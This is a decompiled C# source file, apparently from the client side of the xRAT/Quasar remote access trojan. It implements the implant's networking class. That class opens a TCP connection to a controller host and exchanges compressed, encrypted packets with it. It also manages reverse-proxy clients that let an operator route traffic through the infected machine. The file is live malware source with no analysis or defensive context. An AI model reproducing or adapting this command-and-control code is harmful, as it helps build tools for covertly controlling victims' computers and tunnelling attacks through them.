using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using xClient.Core.Compression;
using xClient.Core.NetSerializer;
using xClient.Core.Packets;
using xClient.Core.ReverseProxy;
using xClient.Core.ReverseProxy.Packets;

namespace xClient.Core.Networking
{
	// Token: 0x0200002A RID: 42
	public class Client
	{
		// Token: 0x14000001 RID: 1
		// (add) Token: 0x0600012C RID: 300 RVA: 0x0000830C File Offset: 0x0000650C
		// (remove) Token: 0x0600012D RID: 301 RVA: 0x00008344 File Offset: 0x00006544
		public event Client.ClientFailEventHandler ClientFail;

		// Token: 0x0600012E RID: 302 RVA: 0x000029AA File Offset: 0x00000BAA
		private void OnClientFail(Exception ex)
		{
			if (this.ClientFail != null)
			{
				this.ClientFail(this, ex);
			}
		}

		// Token: 0x14000002 RID: 2
		// (add) Token: 0x0600012F RID: 303 RVA: 0x0000837C File Offset: 0x0000657C
		// (remove) Token: 0x06000130 RID: 304 RVA: 0x000083B4 File Offset: 0x000065B4
		public event Client.ClientStateEventHandler ClientState;

		// Token: 0x06000131 RID: 305 RVA: 0x000029C1 File Offset: 0x00000BC1
		private void OnClientState(bool connected)
		{
			if (this.Connected == connected)
			{
				return;
			}
			this.Connected = connected;
			if (this.ClientState != null)
			{
				this.ClientState(this, connected);
			}
		}

		// Token: 0x14000003 RID: 3
		// (add) Token: 0x06000132 RID: 306 RVA: 0x000083EC File Offset: 0x000065EC
		// (remove) Token: 0x06000133 RID: 307 RVA: 0x00008424 File Offset: 0x00006624
		public event Client.ClientReadEventHandler ClientRead;

		// Token: 0x06000134 RID: 308 RVA: 0x000029E9 File Offset: 0x00000BE9
		private void OnClientRead(IPacket packet)
		{
			if (this.ClientRead != null)
			{
				this.ClientRead(this, packet);
			}
		}

		// Token: 0x14000004 RID: 4
		// (add) Token: 0x06000135 RID: 309 RVA: 0x0000845C File Offset: 0x0000665C
		// (remove) Token: 0x06000136 RID: 310 RVA: 0x00008494 File Offset: 0x00006694
		public event Client.ClientWriteEventHandler ClientWrite;

		// Token: 0x06000137 RID: 311 RVA: 0x00002A00 File Offset: 0x00000C00
		private void OnClientWrite(IPacket packet, long length, byte[] rawData)
		{
			if (this.ClientWrite != null)
			{
				this.ClientWrite(this, packet, length, rawData);
			}
		}

		// Token: 0x17000038 RID: 56
		// (get) Token: 0x06000138 RID: 312 RVA: 0x00002A19 File Offset: 0x00000C19
		public int BUFFER_SIZE
		{
			get
			{
				return 16384;
			}
		}

		// Token: 0x17000039 RID: 57
		// (get) Token: 0x06000139 RID: 313 RVA: 0x00002A20 File Offset: 0x00000C20
		public uint KEEP_ALIVE_TIME
		{
			get
			{
				return 25000U;
			}
		}

		// Token: 0x1700003A RID: 58
		// (get) Token: 0x0600013A RID: 314 RVA: 0x00002A20 File Offset: 0x00000C20
		public uint KEEP_ALIVE_INTERVAL
		{
			get
			{
				return 25000U;
			}
		}

		// Token: 0x1700003B RID: 59
		// (get) Token: 0x0600013B RID: 315 RVA: 0x00002A27 File Offset: 0x00000C27
		public int HEADER_SIZE
		{
			get
			{
				return 4;
			}
		}

		// Token: 0x1700003C RID: 60
		// (get) Token: 0x0600013C RID: 316 RVA: 0x00002A2A File Offset: 0x00000C2A
		public int MAX_PACKET_SIZE
		{
			get
			{
				return 5242880;
			}
		}

		// Token: 0x1700003D RID: 61
		// (get) Token: 0x0600013D RID: 317 RVA: 0x000084CC File Offset: 0x000066CC
		public ReverseProxyClient[] ProxyClients
		{
			get
			{
				ReverseProxyClient[] result;
				lock (this._proxyClientsLock)
				{
					result = this._proxyClients.ToArray();
				}
				return result;
			}
		}

		// Token: 0x1700003E RID: 62
		// (get) Token: 0x0600013E RID: 318 RVA: 0x00002A31 File Offset: 0x00000C31
		// (set) Token: 0x0600013F RID: 319 RVA: 0x00002A39 File Offset: 0x00000C39
		public bool Connected { get; private set; }

		// Token: 0x06000141 RID: 321 RVA: 0x00008514 File Offset: 0x00006714
		public void Connect(string host, ushort port)
		{
			if (this._serializer == null)
			{
				throw new Exception("Serializer not initialized");
			}
			try
			{
				this.Disconnect();
				this.Initialize();
				this._handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				this._handle.smethod_0(this.KEEP_ALIVE_INTERVAL, this.KEEP_ALIVE_TIME);
				this._readBuffer = new byte[this.BUFFER_SIZE];
				this._tempHeader = new byte[this.HEADER_SIZE];
				this._handle.Connect(host, (int)port);
				if (this._handle.Connected)
				{
					this._handle.BeginReceive(this._readBuffer, 0, this._readBuffer.Length, SocketFlags.None, new AsyncCallback(this.AsyncReceive), null);
					this.OnClientState(true);
				}
			}
			catch (Exception ex)
			{
				this.OnClientFail(ex);
			}
		}

		// Token: 0x06000142 RID: 322 RVA: 0x000085F0 File Offset: 0x000067F0
		private void Initialize()
		{
			lock (this._proxyClientsLock)
			{
				this._proxyClients = new List<ReverseProxyClient>();
			}
		}

		// Token: 0x06000143 RID: 323 RVA: 0x00008638 File Offset: 0x00006838
		private void AsyncReceive(IAsyncResult result)
		{
			try
			{
				int num;
				try
				{
					num = this._handle.EndReceive(result);
					if (num <= 0)
					{
						this.Disconnect();
						return;
					}
				}
				catch (NullReferenceException)
				{
					return;
				}
				catch (ObjectDisposedException)
				{
					return;
				}
				catch (Exception)
				{
					this.Disconnect();
					return;
				}
				byte[] array = new byte[num];
				Array.Copy(this._readBuffer, array, array.Length);
				lock (this._readBuffers)
				{
					this._readBuffers.Enqueue(array);
				}
				lock (this._readingPacketsLock)
				{
					if (!this._readingPackets)
					{
						this._readingPackets = true;
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.AsyncReceive));
					}
				}
			}
			catch
			{
			}
			try
			{
				this._handle.BeginReceive(this._readBuffer, 0, this._readBuffer.Length, SocketFlags.None, new AsyncCallback(this.AsyncReceive), null);
			}
			catch (ObjectDisposedException)
			{
			}
			catch (Exception ex)
			{
				this.OnClientFail(ex);
			}
		}

		// Token: 0x06000144 RID: 324 RVA: 0x000087A0 File Offset: 0x000069A0
		private void AsyncReceive(object state)
		{
			for (;;)
			{
				byte[] array;
				lock (this._readBuffers)
				{
					if (this._readBuffers.Count == 0)
					{
						lock (this._readingPacketsLock)
						{
							this._readingPackets = false;
						}
						break;
					}
					array = this._readBuffers.Dequeue();
				}
				this._readableDataLen += array.Length;
				bool flag3 = true;
				while (flag3)
				{
					switch (this._receiveState)
					{
					case Client.ReceiveType.Header:
						if (this._readableDataLen >= this.HEADER_SIZE)
						{
							int num = this._appendHeader ? (this.HEADER_SIZE - this._tempHeaderOffset) : this.HEADER_SIZE;
							try
							{
								if (this._appendHeader)
								{
									try
									{
										Array.Copy(array, this._readOffset, this._tempHeader, this._tempHeaderOffset, num);
									}
									catch (Exception ex)
									{
										flag3 = false;
										this.OnClientFail(ex);
										break;
									}
									this._payloadLen = BitConverter.ToInt32(this._tempHeader, 0);
									this._tempHeaderOffset = 0;
									this._appendHeader = false;
								}
								else
								{
									this._payloadLen = BitConverter.ToInt32(array, this._readOffset);
								}
								if (this._payloadLen <= 0 || this._payloadLen > this.MAX_PACKET_SIZE)
								{
									throw new Exception("invalid header");
								}
							}
							catch (Exception)
							{
								flag3 = false;
								this.Disconnect();
								break;
							}
							this._readableDataLen -= num;
							this._readOffset += num;
							this._receiveState = Client.ReceiveType.Payload;
						}
						else
						{
							try
							{
								Array.Copy(array, this._readOffset, this._tempHeader, this._tempHeaderOffset, this._readableDataLen);
							}
							catch (Exception ex2)
							{
								flag3 = false;
								this.OnClientFail(ex2);
								break;
							}
							this._tempHeaderOffset += this._readableDataLen;
							this._appendHeader = true;
							flag3 = false;
						}
						break;
					case Client.ReceiveType.Payload:
					{
						if (this._payloadBuffer == null || this._payloadBuffer.Length != this._payloadLen)
						{
							this._payloadBuffer = new byte[this._payloadLen];
						}
						int num2 = (this._writeOffset + this._readableDataLen >= this._payloadLen) ? (this._payloadLen - this._writeOffset) : this._readableDataLen;
						try
						{
							Array.Copy(array, this._readOffset, this._payloadBuffer, this._writeOffset, num2);
						}
						catch (Exception ex3)
						{
							flag3 = false;
							this.OnClientFail(ex3);
							break;
						}
						this._writeOffset += num2;
						this._readOffset += num2;
						this._readableDataLen -= num2;
						if (this._writeOffset == this._payloadLen)
						{
							bool flag4;
							if (!(flag4 = (this._payloadBuffer.Length == 0)))
							{
								this._payloadBuffer = GClass18.smethod_6(this._payloadBuffer);
								flag4 = (this._payloadBuffer.Length == 0);
							}
							if (!flag4)
							{
								try
								{
									this._payloadBuffer = SafeQuickLZ.Decompress(this._payloadBuffer);
								}
								catch (Exception)
								{
									flag3 = false;
									this.Disconnect();
									break;
								}
								flag4 = (this._payloadBuffer.Length == 0);
							}
							if (flag4)
							{
								flag3 = false;
								this.Disconnect();
								break;
							}
							using (MemoryStream memoryStream = new MemoryStream(this._payloadBuffer))
							{
								try
								{
									IPacket packet = (IPacket)this._serializer.Deserialize(memoryStream);
									this.OnClientRead(packet);
								}
								catch (Exception ex4)
								{
									flag3 = false;
									this.OnClientFail(ex4);
									break;
								}
							}
							this._receiveState = Client.ReceiveType.Header;
							this._payloadBuffer = null;
							this._payloadLen = 0;
							this._writeOffset = 0;
						}
						if (this._readableDataLen == 0)
						{
							flag3 = false;
						}
						break;
					}
					}
				}
				if (this._receiveState == Client.ReceiveType.Header)
				{
					this._writeOffset = 0;
				}
				this._readOffset = 0;
				this._readableDataLen = 0;
			}
		}

		// Token: 0x06000145 RID: 325 RVA: 0x00008BC4 File Offset: 0x00006DC4
		public void Send<T>(T packet) where T : IPacket
		{
			if (!this.Connected)
			{
				return;
			}
			lock (this._sendBuffers)
			{
				try
				{
					using (MemoryStream memoryStream = new MemoryStream())
					{
						this._serializer.Serialize(memoryStream, packet);
						byte[] array = memoryStream.ToArray();
						this._sendBuffers.Enqueue(array);
						this.OnClientWrite(packet, array.LongLength, array);
						lock (this._sendingPacketsLock)
						{
							if (this._sendingPackets)
							{
								return;
							}
							this._sendingPackets = true;
						}
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Send));
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000146 RID: 326 RVA: 0x00002A81 File Offset: 0x00000C81
		public void SendBlocking<T>(T packet) where T : IPacket
		{
			this.Send<T>(packet);
			while (this._sendingPackets)
			{
				Thread.Sleep(10);
			}
		}

		// Token: 0x06000147 RID: 327 RVA: 0x00008CC0 File Offset: 0x00006EC0
		private void Send(object state)
		{
			while (this.Connected)
			{
				byte[] payload;
				lock (this._sendBuffers)
				{
					if (this._sendBuffers.Count == 0)
					{
						this.SendCleanup(false);
						return;
					}
					payload = this._sendBuffers.Dequeue();
				}
				try
				{
					this._handle.Send(this.BuildPacket(payload));
					continue;
				}
				catch (Exception ex)
				{
					this.OnClientFail(ex);
					this.SendCleanup(true);
					return;
				}
				break;
			}
			this.SendCleanup(true);
		}

		// Token: 0x06000148 RID: 328 RVA: 0x00008D60 File Offset: 0x00006F60
		private byte[] BuildPacket(byte[] payload)
		{
			payload = SafeQuickLZ.Compress(payload, 3);
			payload = GClass18.smethod_3(payload);
			byte[] array = new byte[payload.Length + this.HEADER_SIZE];
			Array.Copy(BitConverter.GetBytes(payload.Length), array, this.HEADER_SIZE);
			Array.Copy(payload, 0, array, this.HEADER_SIZE, payload.Length);
			return array;
		}

		// Token: 0x06000149 RID: 329 RVA: 0x00008DB4 File Offset: 0x00006FB4
		private void SendCleanup(bool clear = false)
		{
			lock (this._sendingPacketsLock)
			{
				this._sendingPackets = false;
			}
			if (!clear)
			{
				return;
			}
			lock (this._sendBuffers)
			{
				this._sendBuffers.Clear();
			}
		}

		// Token: 0x0600014A RID: 330 RVA: 0x00008E30 File Offset: 0x00007030
		public void Disconnect()
		{
			if (this._handle != null)
			{
				this._handle.Close();
				this._handle = null;
				this._readOffset = 0;
				this._writeOffset = 0;
				this._tempHeaderOffset = 0;
				this._readableDataLen = 0;
				this._payloadLen = 0;
				this._payloadBuffer = null;
				this._receiveState = Client.ReceiveType.Header;
				if (this._proxyClients != null)
				{
					lock (this._proxyClientsLock)
					{
						try
						{
							foreach (ReverseProxyClient reverseProxyClient in this._proxyClients)
							{
								reverseProxyClient.Disconnect();
							}
						}
						catch
						{
						}
					}
				}
				if (GClass17.unsafeStreamCodec_0 != null)
				{
					GClass17.unsafeStreamCodec_0.Dispose();
					GClass17.unsafeStreamCodec_0 = null;
				}
			}
			this.OnClientState(false);
		}

		// Token: 0x0600014B RID: 331 RVA: 0x00002A9B File Offset: 0x00000C9B
		public void AddTypesToSerializer(Type[] types)
		{
			this._serializer = new Serializer(types);
		}

		// Token: 0x0600014C RID: 332 RVA: 0x00008F34 File Offset: 0x00007134
		public void ConnectReverseProxy(ReverseProxyConnect command)
		{
			lock (this._proxyClientsLock)
			{
				this._proxyClients.Add(new ReverseProxyClient(command, this));
			}
		}

		// Token: 0x0600014D RID: 333 RVA: 0x00008F80 File Offset: 0x00007180
		public ReverseProxyClient GetReverseProxyByConnectionId(int connectionId)
		{
			ReverseProxyClient result;
			lock (this._proxyClientsLock)
			{
				result = this._proxyClients.FirstOrDefault((ReverseProxyClient t) => t.ConnectionId == connectionId);
			}
			return result;
		}

		// Token: 0x0600014E RID: 334 RVA: 0x00008FEC File Offset: 0x000071EC
		public void RemoveProxyClient(int connectionId)
		{
			try
			{
				lock (this._proxyClientsLock)
				{
					for (int i = 0; i < this._proxyClients.Count; i++)
					{
						if (this._proxyClients[i].ConnectionId == connectionId)
						{
							this._proxyClients.RemoveAt(i);
							break;
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000073 RID: 115
		private const bool encryptionEnabled = true;

		// Token: 0x04000074 RID: 116
		private const bool compressionEnabled = true;

		// Token: 0x04000079 RID: 121
		private Socket _handle;

		// Token: 0x0400007A RID: 122
		private List<ReverseProxyClient> _proxyClients;

		// Token: 0x0400007B RID: 123
		private readonly object _proxyClientsLock = new object();

		// Token: 0x0400007C RID: 124
		private byte[] _readBuffer;

		// Token: 0x0400007D RID: 125
		private byte[] _payloadBuffer;

		// Token: 0x0400007E RID: 126
		private readonly Queue<byte[]> _sendBuffers = new Queue<byte[]>();

		// Token: 0x0400007F RID: 127
		private bool _sendingPackets;

		// Token: 0x04000080 RID: 128
		private readonly object _sendingPacketsLock = new object();

		// Token: 0x04000081 RID: 129
		private readonly Queue<byte[]> _readBuffers = new Queue<byte[]>();

		// Token: 0x04000082 RID: 130
		private bool _readingPackets;

		// Token: 0x04000083 RID: 131
		private readonly object _readingPacketsLock = new object();

		// Token: 0x04000084 RID: 132
		private byte[] _tempHeader;

		// Token: 0x04000085 RID: 133
		private bool _appendHeader;

		// Token: 0x04000086 RID: 134
		private int _readOffset;

		// Token: 0x04000087 RID: 135
		private int _writeOffset;

		// Token: 0x04000088 RID: 136
		private int _tempHeaderOffset;

		// Token: 0x04000089 RID: 137
		private int _readableDataLen;

		// Token: 0x0400008A RID: 138
		private int _payloadLen;

		// Token: 0x0400008B RID: 139
		private Client.ReceiveType _receiveState;

		// Token: 0x0400008C RID: 140
		private Serializer _serializer;

		// Token: 0x0200002B RID: 43
		// (Invoke) Token: 0x06000150 RID: 336
		public delegate void ClientFailEventHandler(Client s, Exception ex);

		// Token: 0x0200002C RID: 44
		// (Invoke) Token: 0x06000154 RID: 340
		public delegate void ClientStateEventHandler(Client s, bool connected);

		// Token: 0x0200002D RID: 45
		// (Invoke) Token: 0x06000158 RID: 344
		public delegate void ClientReadEventHandler(Client s, IPacket packet);

		// Token: 0x0200002E RID: 46
		// (Invoke) Token: 0x0600015C RID: 348
		public delegate void ClientWriteEventHandler(Client s, IPacket packet, long length, byte[] rawData);

		// Token: 0x0200002F RID: 47
		public enum ReceiveType
		{
			// Token: 0x0400008F RID: 143
			Header,
			// Token: 0x04000090 RID: 144
			Payload
		}
	}
}
